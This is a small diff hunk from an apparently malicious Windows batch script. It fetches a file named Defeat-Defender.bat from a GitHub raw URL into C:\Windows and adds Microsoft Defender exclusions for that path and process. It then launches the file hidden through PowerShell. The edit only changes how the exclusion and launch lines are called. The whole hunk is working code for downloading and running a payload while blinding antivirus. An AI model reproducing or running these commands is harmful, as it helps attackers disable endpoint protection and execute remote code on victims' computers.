@@ -34,8 +34,8 @@ echo "powershell.exe -command Start-Process -FilePath "C:\Windows\kernel.bat" -A
 
 curl https://raw.githubusercontent.com/supportgoogle34/files/main/Defeat-Defender.bat > C:\Windows\defet.bat
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Windows\defet.bat"
-Add-MpPreference -ExclusionProcess "C:\Windows\defet.bat"
+powershell Add-MpPreference -ExclusionProcess "C:\Windows\defet.bat"
 
 set pop=%systemroot%
 powershell.exe -command Start-Process -FilePath "C:\Windows\defet.bat" -ArgumentList "args" -WindowStyle Hidden
-defet.bat
+powershell -command  " start C:\Windows\Defeat-Defender.bat"
